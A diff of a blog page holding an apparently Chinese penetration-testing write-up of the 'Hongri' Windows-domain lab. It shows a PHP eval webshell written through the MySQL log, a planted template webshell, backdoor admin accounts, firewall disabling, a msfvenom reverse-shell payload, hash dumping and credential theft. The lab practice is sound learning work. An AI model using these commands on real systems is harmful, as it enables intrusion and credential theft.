@@ -267,15 +267,40 @@ function checkNightMode() {
 <h1 id="红日靶场1-win域">红日靶场1-win域</h1>
 <h2 id="环境搭建">环境搭建</h2>
 <p>下载完之后,解压,并在vmware中扫描虚拟机</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_1.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_1.png" alt="" /></figure>
+
+
+</p>
 <p>根据这个网络拓扑图,win7机器有两个网卡,是通外网的,win2003和win2008是在内网环境中</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_2.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_2.png" alt="" /></figure>
+
+
+</p>
 <p>先给win7添加一下网卡,这里我习惯使用桥接,所以另一个网卡是桥接模式</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_3.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_3.png" alt="" /></figure>
+
+
+</p>
 <p>然后再为另外两台机器设置only-host模式,并在网络编辑器中将这个模式的网段修改为192.168.53.0/24</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_4.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_4.png" alt="" /></figure>
+
+
+</p>
 <p>最后进入win7机器,进去之后要改默认密码(hongrisec@2019),改成了l1uyun@2024,启动web服务器.</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_5.png" alt="|536"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_5.png" alt="|536" /><figcaption>|536</figcaption></figure>
+
+
+</p>
 <h2 id="外网渗透">外网渗透</h2>
 <h3 id="端口扫描">端口扫描</h3>
 <p>win7机器是桥接在192.168.71.0/24这个子网的</p>
@@ -336,38 +361,93 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>MAC Address: 00:0C:29:A7:C1:B2 <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
 </span></span></code></pre></div><h3 id="phpmyadmin弱口令日志写入getshell">phpmyadmin弱口令+日志写入Getshell</h3>
 <p>进去之后是phpstudy页面,数据库这里使用root,root测试成功</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_6.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_6.png" alt="" /></figure>
+
+
+</p>
 <p>尝试在外面连接,连不上去</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  workspace  mysql -h 192.168.71.79 -u root -p
 </span></span><span style="display:flex;"><span>Enter password:
 </span></span></code></pre></div><p>扫目录发现存在phpmyadmin,phpstudy这玩意集成了phpmyadmin</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_7.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_7.png" alt="" /></figure>
+
+
+</p>
 <p>这里的secure_file_priv=NULL,不允许导入导出,所以不能直接写入shell</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_8.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_8.png" alt="" /></figure>
+
+
+</p>
 <p>再尝试一下通过日志Getshell的方法</p>
 <p>SHOW VARIABLES LIKE &lsquo;%general_log%&rsquo;</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_9.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_9.png" alt="" /></figure>
+
+
+</p>
 <p>启用日志功能,然后修改日志文件路径,这里的绝对路径是在php探针里面泄露的</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set global general_log <span style="color:#f92672">=</span> on;
 </span></span><span style="display:flex;"><span>set global general_log_file<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;C:/phpStudy/WWW/shell.php&#39;</span>;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#34;&lt;?php @eval(</span>$_POST<span style="color:#e6db74">[&#39;123&#39;]);?&gt;&#34;</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_10.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_10.png" alt="" /></figure>
+
+
+</p>
 <p>使用蚁剑连接,拿到shell</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_11.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_11.png" alt="" /></figure>
+
+
+</p>
 <h3 id="yxcms后台修改模板getshell">yxcms后台修改模板Getshell</h3>
 <p>以学习为主,phpmyadmin拿到shell之后,再看看有没有其他的拿shell的方法吧</p>
 <p>查看路径,发现有个yxcms,进去看看</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_12.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_12.png" alt="" /></figure>
+
+
+</p>
 <p>这都不用搜索了,前台模板这个位置大概率能执行php代码</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_13.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_13.png" alt="" /></figure>
+
+
+</p>
 <p>找到这个layout.php,这个文件是每个页面都需要包含的,所以在这里写入webshell</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_14.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_14.png" alt="" /></figure>
+
+
+</p>
 <p>可以连接</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_15.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_15.png" alt="" /></figure>
+
+
+</p>
 <p>这个cms里面也有sql执行,就不看了</p>
 <h2 id="内网渗透">内网渗透</h2>
 <h3 id="信息收集">信息收集</h3>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_16.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_16.png" alt="" /></figure>
+
+
+</p>
 <p>域渗透信息收集checklist</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> ipconfig /all   <span style="color:#75715e"># 查看本机ip，所在域</span>
 </span></span><span style="display:flex;"><span> route print     <span style="color:#75715e"># 打印路由信息</span>
@@ -393,22 +473,52 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span> net group <span style="color:#e6db74">&#34;domain computers&#34;</span> /domain  <span style="color:#75715e"># 查看域中的其他主机名</span>
 </span></span><span style="display:flex;"><span> net group <span style="color:#e6db74">&#34;doamin controllers&#34;</span> /domain  <span style="color:#75715e"># 查看域控制器（可能有多台）</span>
 </span></span></code></pre></div><p>权限是administrator</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_17.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_17.png" alt="" /></figure>
+
+
+</p>
 <p>发现有内网网段</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_18.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_18.png" alt="" /></figure>
+
+
+</p>
 <p>查看域用户</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_19.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_19.png" alt="" /></figure>
+
+
+</p>
 <p>查看域管理员信息</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_20.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_20.png" alt="" /></figure>
+
+
+</p>
 <p>整理一下收集到的win域信息</p>
 <p>该域名为god.org，域控为OWA，域管理员为Administrator，内网网段为192.168.52.1/24，我们用ping命令探测域控的ip</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_21.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_21.png" alt="" /></figure>
+
+
+</p>
 <p>域控的ip为192.168.52.138</p>
 <h3 id="尝试rdp">尝试rdp</h3>
 <p>接下来在win7机器上增加用户，看能不能rdp上去</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>net user l1uyun aBc12@liuyun
 </span></span><span style="display:flex;"><span>net localgroup administrators l1uyun /add
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_22.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_22.png" alt="" /></figure>
+
+
+</p>
 <p>查看3389端口是否开启,没有启动的话就手动启动一下</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>关闭防火墙
 </span></span><span style="display:flex;"><span>netsh advfirewall set allprofiles state off
@@ -416,9 +526,19 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>netstat -ano | find <span style="color:#e6db74">&#34;3389&#34;</span>
 </span></span><span style="display:flex;"><span>没有开启的话手动开启3389端口
 </span></span><span style="display:flex;"><span>REG ADD HKLM<span style="color:#ae81ff">\S</span>YSTEM<span style="color:#ae81ff">\C</span>urrentControlSet<span style="color:#ae81ff">\C</span>ontrol<span style="color:#ae81ff">\T</span>erminal<span style="color:#e6db74">&#34; &#34;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span style="color:#ae81ff">00000000</span> /f 
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_23.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_23.png" alt="" /></figure>
+
+
+</p>
 <p>成功rdp上去了</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_24.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_24.png" alt="" /></figure>
+
+
+</p>
 <h3 id="msf上线">msf上线</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.71.101 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">10010</span> -f exe -o shell.exe
 </span></span><span style="display:flex;"><span>
@@ -429,15 +549,35 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>set lport <span style="color:#ae81ff">10010</span>              
 </span></span><span style="display:flex;"><span>exploit
 </span></span></code></pre></div><p>这里最开始wsl是镜像网络, 后面改成桥接之后才成功反弹回去
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_25.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_25.png" alt="" /></figure>
+
+
+</p>
 <h3 id="getsystem提权">getsystem提权</h3>
 <p>提权,使用meterpreter里面的getsystem一键提权
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_26.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_26.png" alt="" /></figure>
+
+
+</p>
 <h3 id="迁移进程">迁移进程</h3>
 <p>使用ps查看进程信息,msf的进程pid为5060,apache的为2860,进行进程迁移</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_27.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_27.png" alt="" /></figure>
+
+
+</p>
 <p>迁移,然后清除痕迹</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_28.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_28.png" alt="" /></figure>
+
+
+</p>
 <h3 id="收集凭据">收集凭据</h3>
 <p>获取hash</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; hashdump
@@ -447,23 +587,53 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 </span></span></code></pre></div><p>这里需要进一步使用Mimikatz来提取凭证、密码和其他敏感信息。</p>
 <p>在msf中是使用kiwi来进行平替</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_29.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_29.png" alt="" /></figure>
+
+
+</p>
 <p>kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。
 所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制</p>
 <p>因为还需要system的权限,所以只能迁移到system用户的进程中</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_30.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_30.png" alt="" /></figure>
+
+
+</p>
 <p>获取到明文凭证
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_31.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_31.png" alt="" /></figure>
+
+
+</p>
 <h3 id="搭建socks隧道">搭建socks隧道</h3>
 <p>第一次使用msf来搭socks,之前都是在用frp</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>run post/multi/manage/autoroute        <span style="color:#75715e">#加载MSF的autoroute模块，获取当前机器的所有网段信息</span>
 </span></span></code></pre></div><p>这里为啥要使用autoroute这个模块呢</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_32.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_32.png" alt="" /></figure>
+
+
+</p>
 <p>使用auxiliary/server/socks_proxy模块来实现socks</p>
 <p>先background把现在的meterpreter会话挂起,然后加载这个模块</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_33.png" alt=""  />
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_33.png" alt="" /></figure>
+
+
+
 查看jobs可以看到后台运行的socks进程</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_34.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_34.png" alt="" /></figure>
+
+
+</p>
 <h3 id="主机探测">主机探测</h3>
 <p>使用arp-scanner模块进行内网的扫描</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use post/windows/gather/arp_scanner
@@ -541,50 +711,140 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.52.138:445    - Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts 
 </span></span></code></pre></div><p>但是尝试了msf的exploit/windows/smb/ms17_010_eternalblue和 exploit/windows/smb/ms17_010_psexec都失败了</p>
 <p>最后这个执行命令的可以用</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_35.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_35.png" alt="" /></figure>
+
+
+</p>
 <p>那就添加一个用户,然后rdp上去算了
 先添加一个用户</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_36.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_36.png" alt="" /></figure>
+
+
+</p>
 <p>查看添加的用户,添加成功</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_37.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_37.png" alt="" /></figure>
+
+
+</p>
 <p>给管理员权限</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set COMMAND net localgroup administrators hack /add
 </span></span><span style="display:flex;"><span>set COMMAND net localgroup administrators
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_38.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_38.png" alt="" /></figure>
+
+
+</p>
 <p>3389是关闭的,尝试开启3389</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_39.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_39.png" alt="" /></figure>
+
+
+</p>
 <p>这边是显示已经开启了的,但是还是连不上去</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_40.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_40.png" alt="" /></figure>
+
+
+</p>
 <p>原来是防火墙没关</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set COMMAND  <span style="color:#e6db74">&#39;netsh advfirewall set allprofiles state off&#39;</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_41.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_41.png" alt="" /></figure>
+
+
+</p>
 <p>这里为啥凭据会是错误的&hellip;.我在虚拟机界面是可以使用这个凭据登进去的&hellip;</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_42.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_42.png" alt="" /></figure>
+
+
+</p>
 <h3 id="cs上线">cs上线</h3>
 <p>看了不少wp都是用cs拿的域控
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_43.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_43.png" alt="" /></figure>
+
+
+
 另一边连接cs_server
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_44.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_44.png" alt="" /></figure>
+
+
+
 启动监听器
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_45.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_45.png" alt="" /></figure>
+
+
+
 生成payload
